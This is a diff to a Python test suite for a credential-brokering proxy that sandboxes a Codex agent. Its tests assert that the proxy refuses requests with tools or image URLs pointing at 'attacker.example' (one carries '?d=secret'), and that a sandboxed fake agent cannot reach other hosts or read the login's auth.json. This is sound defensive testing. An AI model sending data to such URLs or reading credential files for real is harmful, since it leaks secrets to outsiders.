@@ -129,7 +129,7 @@ def test_a_request_is_forwarded_with_the_real_credential_and_streamed_back(upstr
     assert seen["path"] == "/v1/responses" and seen["body"] == b'{"model":"m","stream":true}'
     assert seen["headers"]["authorization"] == f"Bearer {REAL}" and seen["headers"]["chatgpt-account-id"] == "acct-1"
     assert seen["headers"]["originator"] == "codex_exec"
-    assert summary == {"mode": "chatgpt", "requests": 1, "statuses": [200], "refused": []}
+    assert summary == {"mode": "chatgpt", "model": "m", "requests": 1, "statuses": [200], "refused": []}
     assert REAL not in json.dumps(summary)
 
 
@@ -202,6 +202,70 @@ def test_the_config_points_codex_at_the_broker_and_overrides_the_users_provider(
         assert provider["wire_api"] == "responses"
 
 
+def _body(**kw):
+    return json.dumps({"model": "m", "input": [{"type": "message", "role": "user",
+                                                 "content": [{"type": "input_text", "text": "hi"}]}], **kw}).encode()
+
+
+def test_hosted_search_is_removed_and_local_tools_are_kept(upstream):
+    server, handler = upstream
+    tools = [{"type": "function", "name": "exec_command"},
+             {"type": "namespace", "name": "multi_agent_v1", "tools": [{"type": "function", "name": "close_agent"}]},
+             {"type": "web_search", "external_web_access": True}]
+    with cb.Broker(_up(server), timeout_s=10) as broker:
+        assert _post(broker, body=_body(tools=tools))[0] == 200
+    forwarded = json.loads(handler.seen[0]["body"])
+    assert [t["type"] for t in forwarded["tools"]] == ["function", "namespace"]
+    assert forwarded["input"] == json.loads(_body())["input"]
+
+
+@pytest.mark.parametrize("kw,needle", [
+    ({"tools": [{"type": "mcp", "server_url": "https://attacker.example/mcp"}]}, b"would run at the upstream"),
+    ({"tools": [{"type": "namespace", "tools": [{"type": "image_generation"}]}]}, b"would run at the upstream"),
+    ({"input": [{"type": "message", "role": "user", "content": [
+        {"type": "input_image", "image_url": "https://attacker.example/?d=secret"}]}]}, b"remote URL"),
+    ({"input": [{"type": "message", "role": "user", "content": [{"type": "input_file", "file_id": "file-1"}]}]},
+     b"remote URL"),
+    ({"model": ""}, b"no model"),
+])
+def test_requests_that_would_make_the_upstream_reach_out_are_refused(upstream, kw, needle):
+    server, handler = upstream
+    with cb.Broker(_up(server), timeout_s=10) as broker:
+        status, _, body = _post(broker, body=_body(**kw))
+    assert status == 400 and needle in body and not handler.seen
+
+
+def test_a_data_url_image_is_allowed():
+    image = {"type": "input_image", "image_url": "data:image/png;base64,AAAA"}
+    body = _body(input=[{"type": "message", "role": "user", "content": [image]}])
+    forwarded, model, why = cb.vet_request(body, None)
+    assert (forwarded, model, why) == (body, "m", "")
+
+
+def test_the_model_is_pinned_to_the_first_request(upstream):
+    server, handler = upstream
+    with cb.Broker(_up(server), timeout_s=10) as broker:
+        assert _post(broker, body=_body())[0] == 200
+        status, _, body = _post(broker, body=_body(model="o3-pro"))
+        assert status == 400 and b"not this run's model" in body
+        assert broker.summary()["model"] == "m"
+    assert len(handler.seen) == 1
+
+
+def test_a_stalled_client_does_not_hold_the_broker(upstream, monkeypatch):
+    monkeypatch.setattr(cb._Handler, "timeout", 1.0)
+    server, handler = upstream
+    with cb.Broker(_up(server), timeout_s=10) as broker:
+        import socket
+        stalled = socket.create_connection(("127.0.0.1", broker.port), timeout=5)
+        stalled.sendall(f"POST /v1/responses HTTP/1.1\r\nAuthorization: Bearer {broker.key}\r\n"
+                        "Content-Length: 100\r\n\r\n{".encode())
+        assert stalled.recv(1) == b""  # closed after the socket timeout, with nothing forwarded
+        stalled.close()
+        assert _post(broker, body=_body())[0] == 200  # and the broker still serves
+    assert len(handler.seen) == 1
+
+
 def test_the_proxy_stops_with_the_run(upstream):
     server, _ = upstream
     with cb.Broker(_up(server), timeout_s=10) as broker:
@@ -224,11 +288,14 @@ req = urllib.request.Request(base + "/responses", data=b'{{"model":"m"}}', metho
                                        "Content-Type": "application/json"}})
 report = {{"f": sorted(os.listdir(home)), "k": "OPENAI_API_KEY" in os.environ, "c": {real!r} in cfg,
            "u": urllib.request.urlopen(req, timeout=10).read().decode()[:9]}}
-try:
-    socket.create_connection(("1.1.1.1", 443), timeout=3).close()
-    report["n"] = "reachable"
-except OSError:
-    report["n"] = "denied"
+for key, probe in (("n", lambda: socket.create_connection(("1.1.1.1", 443), timeout=3).close()),
+                   ("p", lambda: socket.create_connection(("127.0.0.1", {upstream_port}), timeout=3).close()),
+                   ("r", lambda: open({login!r}).read())):
+    try:
+        probe()
+        report[key] = "open"
+    except OSError:
+        report[key] = "denied"
 print(json.dumps({{"type": "thread.started", "thread_id": "t"}}))
 print(json.dumps({{"type": "item.completed", "item": {{"type": "agent_message", "text": json.dumps(report)}}}}))
 print(json.dumps({{"type": "turn.completed", "usage": {{"input_tokens": 1, "output_tokens": 1}}}}))
@@ -248,7 +315,8 @@ def test_a_brokered_run_has_no_token_inside_and_no_route_out(tmp_path, upstream,
     monkeypatch.setattr(cb, "API_UPSTREAM", f"http://127.0.0.1:{server.server_address[1]}/v1/responses")
     exe = tmp_path / "bin" / "codex"
     exe.parent.mkdir()
-    exe.write_text(FAKE_CODEX.format(python="/usr/bin/python3", real=REAL))  # the live profile hides a venv in HOME
+    exe.write_text(FAKE_CODEX.format(python="/usr/bin/python3", real=REAL, upstream_port=server.server_address[1],
+                                     login=str(login / "auth.json")))  # /usr/bin/python3: the live profile hides HOME
     exe.chmod(0o755)
     (tmp_path / "root").mkdir()
     (tmp_path / "ws").mkdir()
@@ -263,7 +331,9 @@ def test_a_brokered_run_has_no_token_inside_and_no_route_out(tmp_path, upstream,
     report = json.loads(res["events"]["summary"])  # what the fake saw from inside the sandbox
     assert report["f"] == ["config.toml"] and not report["k"] and not report["c"]  # no token file, key or credential
     assert report["u"] == "data: one"  # the upstream's stream came back through the broker
-    assert report["n"] == "denied"  # and no other host is reachable
+    assert report["n"] == "denied"  # no other host is reachable,
+    assert report["p"] == "denied"  # nor another local port (here: the upstream itself, past the broker),
+    assert report["r"] == "denied"  # and the login outside HOME (tmp_path) cannot be read
     assert res["stage"] == "READY", res["reasons"]
 
 
